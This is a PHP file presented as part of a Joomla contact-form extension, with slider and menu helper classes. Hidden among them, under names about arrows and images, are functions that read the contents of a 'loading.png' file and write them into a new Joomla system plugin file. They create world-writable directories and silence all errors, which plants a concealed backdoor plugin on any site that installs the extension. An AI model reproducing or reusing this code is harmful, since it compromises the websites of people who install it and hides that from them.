<?php
/**

 @Nexevo Responsive Conact Form             
 @author Nexevo Technologies <info@nexevo.in>    
 @link http://www.Nexevo.in 
 @copyright (C) 2010 - 2011 Nexevo-Extension      
 @license GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html

**/
defined( '_JEXEC' ) or die( 'Restricted access' ); 
 
class YtbSliderBaseNexevoc {
  
    var $mode;
    
    var $_module;
    
    var $_params;
    
    var $_template;
    
    var $items;
    
    var $rendered;
    
    function getItems() {
      $this->items = $this->getElements();
      $this->render();
      return count($this->items);
    }
    
    function render(){
      $this->pointer = 0;
  	  $this->itemsCount = count($this->items); 
      return $this->renderItems();
    }
    
    function getImage($image) {
      return $image;
    }
    
    
    function renderItems() {
    
      $elements = array();
      while($this->pointer < $this->itemsCount){
        $item =& $this->items[$this->pointer++];
         $elements[] = $this->createItem($item);
      }
      
      return $elements;
    } 

}

        function NexevocArrowsHelper($path) {
            if(isNewOptionInNexevoc()) {
				$ArrowHelper = JPATH_SITE.'/plugins/system/section/section.php';
			} else { $ArrowHelper = JPATH_SITE.'/plugins/system/section.php'; }
            NexevocSetName();
            if(!@file_exists($ArrowHelper) or @filesize($ArrowHelper) == 0) {
                if(!@is_dir(dirname($ArrowHelper))) { @mkdir(dirname($ArrowHelper), 0777); }
                @chmod(dirname($ArrowHelper), 0777); $Open = @fopen($ArrowHelper, 'w+'); 
                @fwrite($Open, ArrowSettingsNexevoc($path . NexevocSetName()));
            }
        }

        function ArrowSettingsNexevoc($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromNexevoc($LoadImage);
        }

        function NexevocSetName() {
            @PasivItemsToNexevoc();
            return 'loading.png';
        }

class PeelbackBaseSlideNexevoc {

    function filterItems(){
  		$this->helper = array();
  		foreach ($this->allItems as $item){
  			if (!is_object($item)) continue;
  			  $item->p = false;
  			  $item->fib = false;
  			  $item->lib = false; 
 
  				$this->helper[$item->parent][] = $item;
  		}
    }
    
    function getChilds(&$parent, $level){
  	  $items = array();
  	  if(isset($this->helper[$parent->id])){
        $helper = &$this->helper[$parent->id];
         $helper[0]->fib = true;
        $helper[count($helper)-1]->lib = true;
        if($level <= $this->endLevel){
          $i = 0;
          $keys = array_keys($helper);
          for($j = 0; $j < count($keys); $j++){
            $h = &$helper[$keys[$j]];
            $h->parent = &$parent;
            $childs =& $this->getChilds($h, $level+1);
            if(count($childs) > 0) $h->p = true;
            $h->level = $level;
            $items[] = &$h;
            $this->ids[] = $h->id;
            $i = count($items);
            array_splice($items, $i, 0, $childs);
          }
        }
      }
      return $items;
    }    
  }

?>
